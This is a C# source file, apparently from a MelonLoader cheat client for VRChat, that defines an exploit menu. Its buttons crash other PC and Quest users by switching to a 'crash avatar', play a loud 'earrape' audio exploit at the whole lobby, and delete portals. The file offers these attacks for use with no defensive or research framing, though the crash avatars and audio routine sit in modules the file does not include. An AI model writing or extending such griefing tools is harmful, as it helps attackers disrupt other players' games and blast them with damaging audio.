using MelonLoader;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using UnityEngine;
using UnityEngine.UI;
using Vanilla.Buttons.QM;
using Vanilla.Config;
using Vanilla.Exploits;
using Vanilla.Modules;
using Vanilla.Wrappers;
using VRC;
using VRC.Core;
using VRC.SDK3.Components;
using VRC.SDKBase;
using VRC.Udon;

namespace Vanilla.QM.Menu
{

    internal class ExploitMenu
    {
        public bool? forcejump { get; set; }

        internal static string backupID = "";
        internal static void InitMenu(QMNestedButton ExploitMenu)
        {
           

            var PCCrash = new QMSingleButton(ExploitMenu, 1, 0, "PC Crasher", delegate
            {
                Crash(MainConfig.PCCrashID);
            }, "Click me to Crash PC users");

            var QuestCrash = new QMSingleButton(ExploitMenu, 2, 0, "Quest\nCrasher", delegate
            {
                Crash(MainConfig.QuestCrashID);
            }, "Click me to Crash Quest users");


            var EarRapeButton = new QMToggleButton(ExploitMenu, 3, 0, "E1", delegate
            {
                Log("Exploits", "Earrape Enabled");
                RuntimeConfig.ShouldEarRape = true;
                MelonCoroutines.Start(EarRape.EarrapeExploit());
                LogToHud("Earraping Lobby");
            }, delegate
            {
                Log("Exploits", "Earrape Disabled");
                RuntimeConfig.ShouldEarRape = false;
            }, "HAHA E1 Go Burt");


           

            var Deleteportals = new QMSingleButton(ExploitMenu, 4, 0, "DeletePortals", delegate
            {
                var array = Resources.FindObjectsOfTypeAll<PortalTrigger>();
                for (int i = 0; i < array.Length; i++)
                    if (array[i].gameObject.active)
                        GameObject.DestroyImmediate(array[i].gameObject);
                LogToHud("Portal Deleted");
            }, "Bye Bye portals");

         

           

           


        }


        internal static void Crash(string AvatarID)
        {

            backupID = APIUser.CurrentUser.avatarId;

            PlayerWrapper.HideSelf(true);
            PlayerWrapper.ChangePlayerAvatar(AvatarID);
            LogHandler.Log("Crasher", $"Changed To Crash Avatar {AvatarID}");

            GeneralUtils.Delay(15, OnCrashDone);
        }
       
    
        internal static void OnCrashDone()
        {
            PlayerWrapper.ChangePlayerAvatar(backupID);
            LogHandler.Log("Crasher", $"Changed To Avatar {backupID}");
            PlayerWrapper.HideSelf(false);

        }
       
        
       

     

      
    }
}